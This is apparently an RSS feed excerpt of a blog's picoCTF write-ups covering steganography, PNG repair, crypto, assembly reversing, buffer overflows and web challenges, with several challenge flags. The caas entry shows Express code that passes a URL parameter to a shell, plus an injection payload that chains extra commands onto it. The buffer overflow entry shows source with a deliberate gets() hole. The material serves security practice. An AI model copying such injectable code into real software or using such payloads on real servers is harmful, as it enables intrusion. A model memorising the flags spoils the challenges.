&lt;p>Challenge: &lt;a href="https://play.picoctf.org/practice/challenge/115?category=4&amp;amp;page=1">https://play.picoctf.org/practice/challenge/115?category=4&amp;page=1&lt;/a>&lt;/p>
&lt;h2 id="exploit---strings--rot13">
 Exploit - strings + rot13
 &lt;a class="anchor" href="#exploit---strings--rot13">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ strings shark1.pcapng | grep &amp;#34;{&amp;#34;
...
Gur synt vf cvpbPGS{c33xno00_1_f33_h_qrnqorrs}
...
&lt;/code>&lt;/pre>&lt;p>Obviously a encrypted flag $\to$ use rot13
flag: &lt;code>picoCTF{p33kab00_1_s33_u_deadbeef}&lt;/code>&lt;/p></description></item><item><title>PicoCTF - advanced-potion-making</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/misc/image-stego/picoctf---advanced-potion-making/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/misc/image-stego/picoctf---advanced-potion-making/</guid><description>&lt;h1 id="picoctf---advanced-potion-making">
 PicoCTF - advanced-potion-making
 &lt;a class="anchor" href="#picoctf---advanced-potion-making">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-misc">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Misc&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-misc">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="https://play.picoctf.org/practice/challenge/205?bookmarked=0&amp;amp;category=4&amp;amp;page=1&amp;amp;search=&amp;amp;solved=0">advanced-potion-making&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://blog.mythsman.com/post/5d2d62b4a2005d74040ef7eb/">PNG文件格式详解&lt;/a>
&lt;a href="https://zhuanlan.zhihu.com/p/599657891">隐写分析(2) PNG图片隐写&lt;/a>&lt;/p>
&lt;h2 id="exploit---recover--stegsolve">
 Exploit - Recover + StegSolve
 &lt;a class="anchor" href="#exploit---recover--stegsolve">#&lt;/a>
&lt;/h2>
&lt;p>Modify the file signature and length to the right value.
&lt;code>89 50 42 11 0D 0A 1A 0A 00 12 13 14 49 48 44 52&lt;/code>
$\to$
&lt;code>89 50 4E 47 0D 0A 1A 0A 00 00 00 0D 49 48 44 52&lt;/code>&lt;/p>
&lt;ul>
&lt;li>&lt;img src="https://i.imgur.com/Pv1ojSN.png" alt="" />&lt;/li>
&lt;li>&lt;img src="https://i.imgur.com/vLgguSp.png" alt="" />&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="https://i.imgur.com/ZT4PsQ5.png" alt="" />&lt;/p></description></item><item><title>PicoCTF - AES-ABC</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/crypto/des-aes/picoctf---aes-abc/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/crypto/des-aes/picoctf---aes-abc/</guid><description>&lt;h1 id="picoctf---aes-abc">
 PicoCTF - AES-ABC
 &lt;a class="anchor" href="#picoctf---aes-abc">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-crypto">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Crypto&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-crypto">#&lt;/a>
&lt;/h6>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://www.adobe.com/tw/creativecloud/file-types/image/raster/ppm-file.html">What is PPM file?&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Source Code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-python=" data-lang="python=">#!/usr/bin/env python

from Crypto.Cipher import AES
from key import KEY
import os
import math

BLOCK_SIZE = 16
UMAX = int(math.pow(256, BLOCK_SIZE))


def to_bytes(n):
 s = hex(n)
 s_n = s[2:]
 if &amp;#39;L&amp;#39; in s_n:
 s_n = s_n.replace(&amp;#39;L&amp;#39;, &amp;#39;&amp;#39;)
 if len(s_n) % 2 != 0:
 s_n = &amp;#39;0&amp;#39; + s_n
 decoded = s_n.decode(&amp;#39;hex&amp;#39;)

 pad = (len(decoded) % BLOCK_SIZE)
 if pad != 0: 
 decoded = &amp;#34;\0&amp;#34; * (BLOCK_SIZE - pad) + decoded
 return decoded


def remove_line(s):
 # returns the header line, and the rest of the file
 return s[:s.index(&amp;#39;\n&amp;#39;) + 1], s[s.index(&amp;#39;\n&amp;#39;)+1:]


def parse_header_ppm(f):
 data = f.read()

 header = &amp;#34;&amp;#34;

 for i in range(3):
 header_i, data = remove_line(data)
 header += header_i

 return header, data
 

def pad(pt):
 padding = BLOCK_SIZE - len(pt) % BLOCK_SIZE
 return pt + (chr(padding) * padding)


def aes_abc_encrypt(pt):
 cipher = AES.new(KEY, AES.MODE_ECB)
 ct = cipher.encrypt(pad(pt))

 blocks = [ct[i * BLOCK_SIZE:(i+1) * BLOCK_SIZE] for i in range(len(ct) / BLOCK_SIZE)]
 iv = os.urandom(16)
 blocks.insert(0, iv)
 
 for i in range(len(blocks) - 1):
 prev_blk = int(blocks[i].encode(&amp;#39;hex&amp;#39;), 16)
 curr_blk = int(blocks[i+1].encode(&amp;#39;hex&amp;#39;), 16)

 n_curr_blk = (prev_blk + curr_blk) % UMAX
 blocks[i+1] = to_bytes(n_curr_blk)

 ct_abc = &amp;#34;&amp;#34;.join(blocks)
 
 return iv, ct_abc, ct


if __name__==&amp;#34;__main__&amp;#34;:
 with open(&amp;#39;flag.ppm&amp;#39;, &amp;#39;rb&amp;#39;) as f:
 header, data = parse_header_ppm(f)
 
 iv, c_img, ct = aes_abc_encrypt(data)

 with open(&amp;#39;body.enc.ppm&amp;#39;, &amp;#39;wb&amp;#39;) as fw:
 fw.write(header)
 fw.write(c_img)
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - ARMssembly 0</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/reverse/picoctf---armssembly-0/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/reverse/picoctf---armssembly-0/</guid><description>&lt;h1 id="picoctf---armssembly-0">
 PicoCTF - ARMssembly 0
 &lt;a class="anchor" href="#picoctf---armssembly-0">#&lt;/a>
&lt;/h1>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler ARM assembly code&lt;/p>
&lt;pre tabindex="0">&lt;code>	.arch armv8-a
	.file	&amp;#34;chall.c&amp;#34;
	.text
	.align	2
	.global	func1
	.type	func1, %function
func1:
	sub	sp, sp, #16
	str	w0, [sp, 12]
	str	w1, [sp, 8]
	ldr	w1, [sp, 12]
	ldr	w0, [sp, 8]
	cmp	w1, w0
	bls	.L2
	ldr	w0, [sp, 12]
	b	.L3
.L2:
	ldr	w0, [sp, 8]
.L3:
	add	sp, sp, 16
	ret
	.size	func1, .-func1
	.section	.rodata
	.align	3
.LC0:
	.string	&amp;#34;Result: %ld\n&amp;#34;
	.text
	.align	2
	.global	main
	.type	main, %function
main:
	stp	x29, x30, [sp, -48]!
	add	x29, sp, 0
	str	x19, [sp, 16]
	str	w0, [x29, 44]
	str	x1, [x29, 32]
	ldr	x0, [x29, 32]
	add	x0, x0, 8
	ldr	x0, [x0]
	bl	atoi
	mov	w19, w0
	ldr	x0, [x29, 32]
	add	x0, x0, 16
	ldr	x0, [x0]
	bl	atoi
	mov	w1, w0
	mov	w0, w19
	bl	func1
	mov	w1, w0
	adrp	x0, .LC0
	add	x0, x0, :lo12:.LC0
	bl	printf
	mov	w0, 0
	ldr	x19, [sp, 16]
	ldp	x29, x30, [sp], 48
	ret
	.size	main, .-main
	.ident	&amp;#34;GCC: (Ubuntu/Linaro 7.5.0-3ubuntu1~18.04) 7.5.0&amp;#34;
	.section	.note.GNU-stack,&amp;#34;&amp;#34;,@progbits
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - asm4</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/reverse/picoctf---asm4/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/reverse/picoctf---asm4/</guid><description>&lt;h1 id="picoctf---asm4">
 PicoCTF - asm4
 &lt;a class="anchor" href="#picoctf---asm4">#&lt;/a>
&lt;/h1>
&lt;h2 id="description">
 Description
 &lt;a class="anchor" href="#description">#&lt;/a>
&lt;/h2>
&lt;blockquote>
&lt;p>What will asm4(&amp;ldquo;picoCTF_f97bb&amp;rdquo;) return? Submit the flag as a hexadecimal value (starting with &amp;lsquo;0x&amp;rsquo;). NOTE: Your submission for this question will NOT be in the normal flag format.&lt;/p>&lt;/blockquote>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Source Code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-assembly" data-lang="assembly">asm4:
	&amp;lt;+0&amp;gt;:	push ebp
	&amp;lt;+1&amp;gt;:	mov ebp,esp
	&amp;lt;+3&amp;gt;:	push ebx
	&amp;lt;+4&amp;gt;:	sub esp,0x10
	&amp;lt;+7&amp;gt;:	mov DWORD PTR [ebp-0x10],0x27a
	&amp;lt;+14&amp;gt;:	mov DWORD PTR [ebp-0xc],0x0
	&amp;lt;+21&amp;gt;:	jmp 0x518 &amp;lt;asm4+27&amp;gt;
	&amp;lt;+23&amp;gt;:	add DWORD PTR [ebp-0xc],0x1
	&amp;lt;+27&amp;gt;:	mov edx,DWORD PTR [ebp-0xc]
	&amp;lt;+30&amp;gt;:	mov eax,DWORD PTR [ebp+0x8]
	&amp;lt;+33&amp;gt;:	add eax,edx
	&amp;lt;+35&amp;gt;:	movzx eax,BYTE PTR [eax]
	&amp;lt;+38&amp;gt;:	test al,al
	&amp;lt;+40&amp;gt;:	jne 0x514 &amp;lt;asm4+23&amp;gt;
	&amp;lt;+42&amp;gt;:	mov DWORD PTR [ebp-0x8],0x1
	&amp;lt;+49&amp;gt;:	jmp 0x587 &amp;lt;asm4+138&amp;gt;
	&amp;lt;+51&amp;gt;:	mov edx,DWORD PTR [ebp-0x8]
	&amp;lt;+54&amp;gt;:	mov eax,DWORD PTR [ebp+0x8]
	&amp;lt;+57&amp;gt;:	add eax,edx
	&amp;lt;+59&amp;gt;:	movzx eax,BYTE PTR [eax]
	&amp;lt;+62&amp;gt;:	movsx edx,al
	&amp;lt;+65&amp;gt;:	mov eax,DWORD PTR [ebp-0x8]
	&amp;lt;+68&amp;gt;:	lea ecx,[eax-0x1]
	&amp;lt;+71&amp;gt;:	mov eax,DWORD PTR [ebp+0x8]
	&amp;lt;+74&amp;gt;:	add eax,ecx
	&amp;lt;+76&amp;gt;:	movzx eax,BYTE PTR [eax]
	&amp;lt;+79&amp;gt;:	movsx eax,al
	&amp;lt;+82&amp;gt;:	sub edx,eax
	&amp;lt;+84&amp;gt;:	mov eax,edx
	&amp;lt;+86&amp;gt;:	mov edx,eax
	&amp;lt;+88&amp;gt;:	mov eax,DWORD PTR [ebp-0x10]
	&amp;lt;+91&amp;gt;:	lea ebx,[edx+eax*1]
	&amp;lt;+94&amp;gt;:	mov eax,DWORD PTR [ebp-0x8]
	&amp;lt;+97&amp;gt;:	lea edx,[eax+0x1]
	&amp;lt;+100&amp;gt;:	mov eax,DWORD PTR [ebp+0x8]
	&amp;lt;+103&amp;gt;:	add eax,edx
	&amp;lt;+105&amp;gt;:	movzx eax,BYTE PTR [eax]
	&amp;lt;+108&amp;gt;:	movsx edx,al
	&amp;lt;+111&amp;gt;:	mov ecx,DWORD PTR [ebp-0x8]
	&amp;lt;+114&amp;gt;:	mov eax,DWORD PTR [ebp+0x8]
	&amp;lt;+117&amp;gt;:	add eax,ecx
	&amp;lt;+119&amp;gt;:	movzx eax,BYTE PTR [eax]
	&amp;lt;+122&amp;gt;:	movsx eax,al
	&amp;lt;+125&amp;gt;:	sub edx,eax
	&amp;lt;+127&amp;gt;:	mov eax,edx
	&amp;lt;+129&amp;gt;:	add eax,ebx
	&amp;lt;+131&amp;gt;:	mov DWORD PTR [ebp-0x10],eax
	&amp;lt;+134&amp;gt;:	add DWORD PTR [ebp-0x8],0x1
	&amp;lt;+138&amp;gt;:	mov eax,DWORD PTR [ebp-0xc]
	&amp;lt;+141&amp;gt;:	sub eax,0x1
	&amp;lt;+144&amp;gt;:	cmp DWORD PTR [ebp-0x8],eax
	&amp;lt;+147&amp;gt;:	jl 0x530 &amp;lt;asm4+51&amp;gt;
	&amp;lt;+149&amp;gt;:	mov eax,DWORD PTR [ebp-0x10]
	&amp;lt;+152&amp;gt;:	add esp,0x10
	&amp;lt;+155&amp;gt;:	pop ebx
	&amp;lt;+156&amp;gt;:	pop ebp
	&amp;lt;+157&amp;gt;:	ret 
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - babygame01</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---babygame01/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---babygame01/</guid><description>&lt;h1 id="picoctf---babygame01">
 PicoCTF - babygame01
 &lt;a class="anchor" href="#picoctf---babygame01">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>Bof&lt;/p>
&lt;h2 id="description--hint">
 Description &amp;amp; Hint
 &lt;a class="anchor" href="#description--hint">#&lt;/a>
&lt;/h2>
&lt;blockquote>
&lt;p>Get the flag and reach the exit. Welcome to BabyGame! Navigate around the map and see what you can find! The game is available to download here. There is no source available, so you&amp;rsquo;ll have to figure your way around the map. You can connect with it using nc saturn.picoctf.net 50227.
Hint 1: Use &amp;lsquo;w&amp;rsquo;,&amp;lsquo;a&amp;rsquo;,&amp;rsquo;s&amp;rsquo;,&amp;rsquo;d&amp;rsquo; to move around.
Hint 2: There may be secret commands to make your life easy.&lt;/p></description></item><item><title>PicoCTF - babygame02</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---babygame02/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---babygame02/</guid><description>&lt;h1 id="picoctf---babygame02">
 PicoCTF - babygame02
 &lt;a class="anchor" href="#picoctf---babygame02">#&lt;/a>
&lt;/h1>
&lt;h2 id="source">
 Source
 &lt;a class="anchor" href="#source">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler IDA Main Function&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#66d9ef">__cdecl&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> argc, &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">**&lt;/span>argv, &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">**&lt;/span>envp)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">int&lt;/span> position[&lt;span style="color:#ae81ff">2&lt;/span>]; &lt;span style="color:#75715e">// [esp+0h] [ebp-AA0h] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> map[&lt;span style="color:#ae81ff">2700&lt;/span>]; &lt;span style="color:#75715e">// [esp+Bh] [ebp-A95h] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> input; &lt;span style="color:#75715e">// [esp+A97h] [ebp-9h]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#f92672">*&lt;/span>p_argc; &lt;span style="color:#75715e">// [esp+A98h] [ebp-8h]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> p_argc &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span>argc;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> init_player(position);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> init_map(map, position);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print_map(map);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> signal(&lt;span style="color:#ae81ff">2&lt;/span>, sigint_handler);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">do&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">do&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> input &lt;span style="color:#f92672">=&lt;/span> getchar();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> move_player(position, input, map);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print_map(map);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span> ( position[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">29&lt;/span> ); &lt;span style="color:#75715e">// y座標
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span> ( position[&lt;span style="color:#ae81ff">1&lt;/span>] &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">89&lt;/span> ); &lt;span style="color:#75715e">// x座標
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> puts(&lt;span style="color:#e6db74">&amp;#34;You win!&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::
:::spoiler IDA Win Function&lt;/p></description></item><item><title>PicoCTF - buffer overflow 2</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---buffer-overflow-2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---buffer-overflow-2/</guid><description>&lt;h1 id="picoctf---buffer-overflow-2">
 PicoCTF - buffer overflow 2
 &lt;a class="anchor" href="#picoctf---buffer-overflow-2">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>Bof&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Source Code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;

#define BUFSIZE 100
#define FLAGSIZE 64

void win(unsigned int arg1, unsigned int arg2) {
 char buf[FLAGSIZE];
 FILE *f = fopen(&amp;#34;flag.txt&amp;#34;,&amp;#34;r&amp;#34;);
 if (f == NULL) {
 printf(&amp;#34;%s %s&amp;#34;, &amp;#34;Please create &amp;#39;flag.txt&amp;#39; in this directory with your&amp;#34;,
 &amp;#34;own debugging flag.\n&amp;#34;);
 exit(0);
 }

 fgets(buf,FLAGSIZE,f);
 if (arg1 != 0xCAFEF00D)
 return;
 if (arg2 != 0xF00DF00D)
 return;
 printf(buf);
}

void vuln(){
 char buf[BUFSIZE];
 gets(buf);
 puts(buf);
}

int main(int argc, char **argv){

 setvbuf(stdout, NULL, _IONBF, 0);
 
 gid_t gid = getegid();
 setresgid(gid, gid, gid);

 puts(&amp;#34;Please enter your string: &amp;#34;);
 vuln();
 return 0;
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - c0rrupt</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/misc/image-stego/picoctf---c0rrupt/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/misc/image-stego/picoctf---c0rrupt/</guid><description>&lt;h1 id="picoctf---c0rrupt">
 PicoCTF - c0rrupt
 &lt;a class="anchor" href="#picoctf---c0rrupt">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-misc">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Misc&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-misc">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="https://play.picoctf.org/practice/challenge/53?category=4&amp;amp;page=3">c0rrupt&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://bernie6401.github.io/uwox6r5hQ6St_8G-4mv1_g">advanced-potion-making:two::+1:&lt;/a>&lt;/p>
&lt;h2 id="exploit---recover-png-file">
 Exploit - Recover PNG file
 &lt;a class="anchor" href="#exploit---recover-png-file">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>Analyze&lt;/li>
&lt;/ol>
&lt;ul>
&lt;li>
&lt;p>Header
&lt;code>89 65 4E 34 0D 0A B0 AA&lt;/code>
$\to$
&lt;code>89 50 4E 47 0D 0A 1A 0A&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>IHDR
&lt;code>43 22 44 52&lt;/code>
$\to$
&lt;code>49 48 44 52&lt;/code>
Then use &lt;code>pngcheck&lt;/code> to analyze the file. It said the header still have some error.&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ pngcheck mystery
mystery CRC error in chunk pHYs (computed 38d82c82, expected 495224f0)
ERROR: mystery
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>Revise &lt;code>pHYs&lt;/code>
You can open an arbitrary png file and observe &lt;code>pHYs&lt;/code> part.&lt;/p></description></item><item><title>PicoCTF - caas</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---caas/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---caas/</guid><description>&lt;h1 id="picoctf---caas">
 PicoCTF - caas
 &lt;a class="anchor" href="#picoctf---caas">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-web">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-web">#&lt;/a>
&lt;/h6>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://lab.feifei.tw/practice/ci/l1.php">Command Injection&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-javascript=" data-lang="javascript=">const express = require(&amp;#39;express&amp;#39;);
const app = express();
const { exec } = require(&amp;#39;child_process&amp;#39;);

app.use(express.static(&amp;#39;public&amp;#39;));

app.get(&amp;#39;/cowsay/:message&amp;#39;, (req, res) =&amp;gt; {
 exec(`/usr/games/cowsay ${req.params.message}`, {timeout: 5000}, (error, stdout) =&amp;gt; {
 if (error) return res.status(500).end();
 res.type(&amp;#39;txt&amp;#39;).send(stdout).end();
 });
});

app.listen(3000, () =&amp;gt; {
 console.log(&amp;#39;listening&amp;#39;);
});
&lt;/code>&lt;/pre>&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>直覺是command injection&lt;/p>
&lt;h2 id="exploit---easy-command-injection">
 Exploit - Easy Command Injection
 &lt;a class="anchor" href="#exploit---easy-command-injection">#&lt;/a>
&lt;/h2>
&lt;p>Payload: &lt;code>/cowsay/123;ls;cat falg.txt&lt;/code>
Flag: &lt;code>picoCTF{moooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0o}&lt;/code>&lt;/p></description></item><item><title>PicoCTF - Compress and Attack</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/crypto/picoctf---compress-and-attack/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/crypto/picoctf---compress-and-attack/</guid><description>&lt;h1 id="picoctf---compress-and-attack">
 PicoCTF - Compress and Attack
 &lt;a class="anchor" href="#picoctf---compress-and-attack">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-crypto">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Crypto&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-crypto">#&lt;/a>
&lt;/h6>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>zlib compression property
詳細說明一下zlib的壓縮特性是當壓縮的內容出現重複字元的時候，壓縮過後的長度會不變&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&amp;gt;&amp;gt;&amp;gt; import zlib
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;gt;&amp;gt;&amp;gt; enc &lt;span style="color:#f92672">=&lt;/span> zlib.compress&lt;span style="color:#f92672">(&lt;/span>bytes&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;picoCTF{picoCTF{testing_123456}&amp;#34;&lt;/span>.encode&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;utf-8&amp;#34;&lt;/span>&lt;span style="color:#f92672">)))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;gt;&amp;gt;&amp;gt; len&lt;span style="color:#f92672">(&lt;/span>enc&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">33&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;gt;&amp;gt;&amp;gt; enc &lt;span style="color:#f92672">=&lt;/span> zlib.compress&lt;span style="color:#f92672">(&lt;/span>bytes&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;picoCTF{tepicoCTF{testing_123456}&amp;#34;&lt;/span>.encode&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;utf-8&amp;#34;&lt;/span>&lt;span style="color:#f92672">)))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;gt;&amp;gt;&amp;gt; len&lt;span style="color:#f92672">(&lt;/span>enc&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">33&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;gt;&amp;gt;&amp;gt; enc &lt;span style="color:#f92672">=&lt;/span> zlib.compress&lt;span style="color:#f92672">(&lt;/span>bytes&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;picoCTF{tekpicoCTF{testing_123456}&amp;#34;&lt;/span>.encode&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;utf-8&amp;#34;&lt;/span>&lt;span style="color:#f92672">)))&lt;/span>
